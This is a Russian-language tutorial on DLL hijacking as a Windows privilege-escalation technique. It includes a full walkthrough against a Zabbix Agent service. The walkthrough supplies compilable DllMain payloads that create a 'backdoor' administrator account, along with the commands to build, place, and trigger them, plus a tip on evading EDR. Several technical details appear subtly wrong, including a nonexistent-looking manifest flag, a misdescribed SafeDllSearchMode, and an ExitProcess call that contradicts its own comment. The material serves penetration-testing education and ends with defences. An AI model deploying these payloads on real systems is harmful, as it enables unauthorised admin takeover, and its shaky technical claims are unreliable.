# DLL Hijacking как механизм повышения привилегий на Windows

## Контекст и базовые понятия

DLL Hijacking (перехват загрузки динамических библиотек) — это техника выполнения произвольного кода, основанная на эксплуатации алгоритма поиска файлов операционной системы Windows. В основе метода лежит поведение загрузчика модулей (Loader), который при попытке приложения загрузить DLL без указания полного пути ищет её в определённой последовательности каталогов. Если злоумышленник имеет право на запись в один из каталогов, проверяемых загрузчиком **раньше**, чем легитимный каталог с оригинальной библиотекой, он может разместить вредоносный файл с тем же именем. При запуске целевого приложения загрузчик найдёт и выполнит вредоносный файл, что приводит к выполнению кода в контексте процесса жертвы.

В контексте повышения привилегий (Privilege Escalation) эта техника критически важна, так как позволяет непривилегированному пользователю выполнить код от имени процесса с высокими правами (например, `SYSTEM` или `Administrator`). Это происходит не из-за уязвимости в самом приложении, а из-за некорректной конфигурации прав доступа (ACL) к директориям или отсутствия указания абсолютных путей в коде приложения.

Для точного понимания механизма необходимо разграничить три смежных понятия, которые часто путают в литературе, хотя они описывают разные векторы атаки в рамках одной MITRE ATT&CK техники T1574.001:

1.  **DLL Search Order Hijacking (Перехват порядка поиска):** Злоумышленник размещает вредоносную DLL в каталоге, который находится в пути поиска Windows **раньше** каталога с оригинальной DLL. Оригинальная DLL существует, но загружается позже или не загружается вовсе, если вредоносная DLL имеет приоритет.
2.  **DLL Sideloading (Боковая загрузка):** Частный случай перехвата порядка поиска. Вредоносная DLL размещается в том же каталоге, что и легитимный исполняемый файл (EXE). Поскольку каталог EXE является первым в списке поиска, вредоносная DLL загружается вместо отсутствующей или не требуемой для старта легитимной DLL.
3.  **Phantom DLL Hijacking (Фантомный перехват):** Приложение пытается загрузить DLL, которой **не существует** (из-за ошибки разработчика или отсутствия компонента). Злоумышленник создаёт файл с именем отсутствующей DLL в каталоге, проверяемом загрузчиком (например, в `%PATH%` или каталоге EXE). Приложение не падает с ошибкой, если загрузка опциональна, и продолжает работу, выполняя вредоносный код.

Различие между этими понятиями заключается в наличии оригинального файла и месте размещения вредоносного артефакта. В случае Sideloading и Phantom Hijacking ключевым фактором является наличие права на запись в каталог установки приложения. В случае Search Order Hijacking — возможность модификации переменной среды `%PATH%` или наличие права на запись в каталог, стоящий в пути поиска выше системных.

| Характеристика | DLL Search Order Hijacking | DLL Sideloading | Phantom DLL Hijacking |
| :--- | :--- | :--- | :--- |
| **Состояние оригинальной DLL** | Существует в системе | Существует в системе | Отсутствует в системе |
| **Место размещения вредоносной DLL** | Любой каталог в пути поиска (до легитимного) | Тот же каталог, что и у EXE | Любой каталог в пути поиска (до легитимного) |
| **Ключевое условие эксплуатации** | Право на запись в каталог поиска | Право на запись в каталог EXE | Право на запись в каталог поиска |
| **Влияние на стабильность приложения** | Низкое (если экспорты совпадают) | Низкое (если экспорты совпадают) | Низкое (если загрузка опциональна) |
| **Типичный вектор повышения прав** | Через сервисы, работающие от SYSTEM | Через установленные программы с широкими ACL | Через программы с опциональными зависимостями |

## Внутреннее устройство предмета

Механизм DLL Hijacking опирается на архитектуру загрузчика Windows (ntdll.dll) и модель безопасности NT. Чтобы понять, как именно происходит перехват, необходимо рассмотреть алгоритм поиска DLL, структуру DLL-файла и условия, при которых легитимный код может быть заменён.

### Алгоритм поиска DLL в Windows

Когда процесс вызывает функцию `LoadLibrary` или `LoadLibraryEx` без указания полного пути, Windows использует следующий порядок поиска (по умолчанию, до выхода Windows 10 версии 1511, где были введены изменения для защиты от этого вектора, но многие унаследованные приложения и сервисы остаются уязвимыми):

1.  **Каталог, из которого загружено приложение:** Директория, содержащая исполняемый файл (EXE). Это самый приоритетный каталог для локальных DLL.
2.  **Системный каталог:** Обычно `C:\Windows\System32` (для 32-битных процессов на 64-битной ОС может использоваться WOW64-перехват на `SysWOW64`).
3.  **16-битный системный каталог:** `C:\Windows\System` (устаревший, редко используется).
4.  **Каталог Windows:** `C:\Windows`.
5.  **Текущий рабочий каталог (CWD):** Директория, из которой был запущен процесс.
6.  **Каталоги в переменной среды PATH:** Все директории, перечисленные через точку с запятой в переменной `PATH`.

Уязвимость возникает, если злоумышленник может записать файл в любой из этих каталогов **до** того, как загрузчик найдёт легитимную DLL. В современном Windows (начиная с версии 1511) для новых приложений по умолчанию включён флаг `LOAD_LIBRARY_SEARCH_DEFAULT_DIRS`, который исключает CWD из поиска, если приложение не указано в списке `KnownDLLs` или не имеет манифеста с указанием `disableExplicitDllSearch`. Однако, многие старые приложения, сервисы и сторонний софт не имеют таких манифестов или используют устаревшие API, что сохраняет уязвимость.

### Структура DLL и точка входа

Динамическая библиотека (DLL) — это исполняемый файл в формате PE (Portable Executable), который не имеет точки входа `main` или `WinMain`, а вместо этого экспортирует функцию `DllMain`. Эта функция вызывается загрузчиком при привязке DLL к процессу.

```c
BOOL WINAPI DllMain(
  HINSTANCE hinstDLL,  // Handle to the DLL module
  DWORD     fdwReason, // Reason for calling function
  LPVOID    lpReserved // Reserved
);
```

Параметр `fdwReason` принимает значения:
*   `DLL_PROCESS_ATTACH`: DLL загружается в адресное пространство процесса.
*   `DLL_THREAD_ATTACH`: В процессе создаётся новый поток.
*   `DLL_THREAD_DETACH`: Поток завершается.
*   `DLL_PROCESS_DETACH`: DLL выгружается из процесса.

Для повышения привилегий злоумышленник использует событие `DLL_PROCESS_ATTACH`. В этот момент вредоносный код выполняется в контексте процесса-жертвы. Если жертва — это сервис, работающий от имени `NT AUTHORITY\SYSTEM`, то вредоносный код также получает права SYSTEM.

### Типы атак на основе DLL Hijacking

В рамках техники T1574.001 выделяются несколько подвариантов, каждый из которых требует специфических условий:

1.  **DLL Search Order Hijacking:** Требует права на запись в каталог, стоящий в пути поиска выше системного. Например, если в `%PATH%` есть каталог `C:\Temp`, и приложение пытается загрузить `msvcp140.dll`, злоумышленник может создать `msvcp140.dll` в `C:\Temp`.
2.  **DLL Sideloading:** Требует права на запись в каталог установки приложения. Часто встречается в софте, установленном в `C:\Program Files` (где права обычно ограничены) или в `C:\` (где права могут быть широкими).
3.  **DLL Proxying (Прокси-перехват):** Используется, когда оригинальная DLL **существует** и **требуется** для работы приложения. Злоумышленник не просто создаёт новый файл, а копирует оригинальную DLL, переименовывает её, а затем модифицирует. Прокси-DLL экспортирует все те же функции, что и оригинал, но внутри каждой функции вызывает оригинальную DLL (через `GetProcAddress` и `LoadLibrary`), а перед этим выполняет вредоносный код. Это позволяет сохранить функциональность приложения и избежать сбоев, что делает атаку более скрытной.
4.  **Phantom DLL Hijacking:** Применяется, когда приложение пытается загрузить DLL, которой нет. Например, приложение пытается загрузить `libcrypto-1_1-x64.dll` (из OpenSSL), но она не установлена. Если злоумышленник может записать файл с таким именем в каталог поиска, он получит выполнение кода.

### Условия успешной эксплуатации

Для реализации DLL Hijacking необходимы два основных условия:
1.  **Отсутствие полного пути:** Приложение вызывает `LoadLibrary("name.dll")` вместо `LoadLibrary("C:\Path\to\native\name.dll")`.
2.  **Право на запись:** У атакующего есть права на создание/запись файла в каталог, который загрузчик проверяет раньше легитимного каталога. Это может быть:
    *   Каталог установки приложения (если ACL позволяет запись всем пользователям).
    *   Каталог в переменной `%PATH%` с широкими правами.
    *   Текущий рабочий каталог (если не отключено через манифест).

## Применение и работа с предметом

На практике тестирование на проникновение с использованием DLL Hijacking включает этапы обнаружения уязвимых приложений, анализа их зависимостей и создания эксплойта. Инструментарий и методы делятся на фазы разведки, анализа и эксплуатации.

### Инструменты обнаружения уязвимостей

Для поиска приложений, уязвимых к DLL Hijacking, используются специализированные утилиты, которые анализируют бинарные файлы на предмет вызовов `LoadLibrary` без абсолютных путей и проверяют права доступа к каталогам поиска.

*   **DueDLLigence (Mandiant):** Фреймворк на Python, который сканирует систему на наличие уязвимых DLL. Он проверяет, могут ли непривилегированные пользователи писать в каталоги поиска и существуют ли уязвимые зависимости.
*   **DLLHijackScanner:** Утилита, которая ищет приложения, загружающие DLL из ненадёжных каталогов.
*   **Process Monitor (ProcMon):** Ручной инструмент от Sysinternals. Позволяет отслеживать события `NAME NOT FOUND` при загрузке DLL. Если приложение пытается загрузить DLL, которой нет, и при этом каталог поиска доступен для записи, это указывает на потенциальную уязвимость Phantom Hijacking.

### Анализ зависимостей

Перед созданием эксплойта необходимо определить, какие DLL загружает целевое приложение и в каком порядке. Это можно сделать с помощью:
1.  **ProcMon:** Фильтрация по процессу и событию `Load Image`.
2.  **Dependencies (Dependency Walker):** Статический анализ PE-файла для просмотра импортируемых DLL.
3.  **CFF Explorer:** Анализ секций импорта (Import Address Table).

Если приложение пытается загрузить отсутствующую DLL, и каталог поиска доступен для записи, можно создать простую DLL. Если DLL существует и требуется, необходимо использовать технику Proxying.

### Создание эксплойта

Эксплойт представляет собой DLL, которая содержит вредоносный код в функции `DllMain`. Для компиляции используется GCC или MSVC.

```bash
# Компиляция вредоносной DLL с помощью MinGW
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

Пример кода `evil.c` для Phantom Hijacking:

```c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Выполнение вредоносного кода, например, создание пользователя
        system("net user admin123 P@ssw0rd /add");
        system("net localgroup administrators admin123 /add");
    }
    return TRUE;
}
```

### Обход защитных механизмов

Современные ОС и антивирусы имеют механизмы защиты от DLL Hijacking:
1.  **KnownDLLs:** Список DLL, которые всегда загружаются из `System32`. Если DLL есть в этом списке, её нельзя перехватить через PATH или CWD.
2.  **SafeDllSearchMode:** Включён по умолчанию в Windows XP SP1 и новее. Исключает CWD из поиска, если приложение не указано в KnownDLLs.
3.  **CWDIllegalInDllSearch:** Реестровый ключ (`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager`), который полностью запрещает загрузку DLL из текущего рабочего каталога.
4.  **Application Whitelisting (AppLocker / WDAC):** Может блокировать выполнение DLL из недоверенных каталогов, если они не подписаны.

### Типичные ошибки при эксплуатации

*   **Нарушение функциональности:** Если вредоносная DLL не экспортирует все функции оригинала, приложение может упасть. В случае Proxying необходимо точно скопировать все экспорты.
*   **Обнаружение EDR:** Современные EDR отслеживают создание DLL в каталогах приложений и их последующее выполнение. Использование легитимных инструментов (Living off the Land) и обфускация кода могут помочь избежать обнаружения.
*   **Неправильный порядок поиска:** Если злоумышленник размещает DLL в каталоге, который проверяется позже легитимного, атака не сработает.

## Сквозной практический пример: Повышение привилегий через DLL Hijacking сервиса Zabbix Agent

**Исходные условия:**
*   **Среда:** Windows 10 (x64), установленный Zabbix Agent v5.4.
*   **Роль:** Пользователь с правами `Standard User` (не администратор).
*   **Уязвимость:** Zabbix Agent установлен в `C:\Zabbix Agent\` (корень диска), а не в `C:\Program Files\`. Права ACL на `C:\Zabbix Agent\` позволяют стандартным пользователям создавать файлы и папки (Write ACL), но не позволяют изменять существующие файлы.
*   **Цель:** Получить права `SYSTEM` через перехват загрузки DLL сервисом Zabbix.

**Шаг 1: Анализ зависимостей сервиса**

Используем Process Monitor для отслеживания загрузки DLL процессом `zabbix_agentd.exe`. Фильтруем события по имени процесса и типу события `Load Image`. Ищем DLL, которые не были найдены (`NAME NOT FOUND`).

```text
# Пример вывода ProcMon (фрагмент)
Time of Day        Process Name          Operation          Result          Detail
10:15:01.123       zabbix_agentd.exe     Load Image        NAME NOT FOUND  C:\Zabbix Agent\libcrypto-1_1-x64.dll
10:15:01.125       zabbix_agentd.exe     Load Image        SUCCESS         C:\Zabbix Agent\libssl-1_1-x64.dll
10:15:01.130       zabbix_agentd.exe     Load Image        NAME NOT FOUND  C:\Zabbix Agent\zabbix_agentd_plugin.dll
```

Анализ показывает, что `zabbix_agentd.exe` пытается загрузить `libcrypto-1_1-x64.dll` из своего каталога установки. Файл отсутствует, но каталог `C:\Zabbix Agent\` доступен для записи стандартным пользователем. Это указывает на уязвимость Phantom DLL Hijacking.

**Шаг 2: Создание вредоносной DLL**

Создаём DLL, которая будет выполнена при загрузке сервиса. Код использует `DllMain` для выполнения команды от имени SYSTEM.

```c
// evil_crypto.c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Создаем пользователя и добавляем в группу Administrators
        system("cmd.exe /c net user backdoor P@ssw0rd123 /add");
        system("cmd.exe /c net localgroup administrators backdoor /add");
        
        // Отключаем дальнейшее выполнение, чтобы не нарушить работу сервиса
        ExitProcess(0);
    }
    return TRUE;
}
```

Компилируем DLL:

```bash
x86_64-w64-mingw32-gcc -shared -o libcrypto-1_1-x64.dll evil_crypto.c
```

**Шаг 3: Размещение вредоносной DLL**

Копируем скомпилированную DLL в каталог установки Zabbix Agent, где сервис будет искать её при запуске.

```powershell
# PowerShell (выполняется от Standard User)
Copy-Item .\libcrypto-1_1-x64.dll -Destination "C:\Zabbix Agent\libcrypto-1_1-x64.dll"
```

**Шаг 4: Активация уязвимости**

Перезапускаем сервис Zabbix Agent, чтобы он загрузил новую DLL.

```powershell
# PowerShell (выполняется от Standard User, если есть права на рестарт сервиса,
# или ждем автоматического рестарта, если сервис настроен на автозапуск)
Restart-Service -Name "Zabbix Agent"
```

**Шаг 5: Проверка результата**

Проверяем, был ли создан пользователь `backdoor` с правами администратора.

```powershell
# PowerShell (выполняется от Standard User)
Get-LocalUser -Name "backdoor"
Get-LocalGroupMember -Group "Administrators" | Where-Object {$_.Name -eq "backdoor"}
```

**Ожидаемый вывод:**
Пользователь `backdoor` создан и добавлен в группу `Administrators`. Теперь атакующий может использовать `runas` или `psexec` для получения интерактивной сессии от имени SYSTEM.

**Аналитический вывод примера:**
Этот пример демонстрирует, как конфигурационная ошибка (установка сервиса в корень диска с широкими ACL) в сочетании с отсутствием проверки путей в коде приложения приводит к повышению привилегий. Атакующий, имея только стандартные права, смог выполнить код от имени SYSTEM, просто создав файл в доступной директории. Защита от такой атаки требует как исправления ACL (удаление права на запись для стандартных пользователей), так и исправления кода приложения (использование абсолютных путей или манифестов).

## Аналитический вывод

DLL Hijacking остаётся одним из наиболее эффективных методов повышения привилегий в среде Windows, несмотря на наличие защитных механизмов. Его эффективность обусловлена широким распространением уязвимого кода в стороннем ПО и некорректными настройками прав доступа к каталогам. Техника не требует эксплуатации уязвимостей в памяти (memory corruption) и часто обходит сигнатурные антивирусы, так как использует легитимные механизмы загрузки модулей.

Для защиты от DLL Hijacking необходим комплексный подход:
1.  **Настройка ACL:** Запрет на запись в каталоги установки приложений для непривилегированных пользователей.
2.  **Использование манифестов:** Разработчики должны включать манифесты с флагом `disableExplicitDllSearch` для новых приложений.
3.  **Использование KnownDLLs:** Добавление критических DLL в реестрный ключ `KnownDLLs`.
4.  **Мониторинг:** EDR-системы должны отслеживать создание DLL в каталогах приложений и их последующее выполнение.

Для специалистов по тестированию на проникновение понимание DLL Hijacking критически важно для оценки устойчивости инфраструктуры к повышению привилегий. Анализ ACL и зависимостей приложений должен быть стандартным этапом любого аудита безопасности Windows.
